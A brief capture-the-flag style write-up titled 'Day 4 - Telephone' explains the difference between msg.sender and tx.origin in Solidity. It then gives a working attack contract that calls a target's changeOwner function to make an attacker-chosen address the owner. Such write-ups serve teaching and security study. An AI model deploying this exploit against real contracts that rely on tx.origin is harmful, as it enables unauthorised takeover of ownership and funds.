# Day 4 - Telephone

When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from which is tx.origin

```js
pragma solidity ^0.6.0;
contract AttackTelephone {
  address public telephone;

  constructor (address _telephone) public {
      telephone = _telephone;
  }

  function changeOwnerMaliciously(address badOwner) public {
    bytes memory payload = abi.encodeWithSignature("changeOwner(address)", badOwner);
    (bool success, ) = telephone.call(payload);
  }
}
```
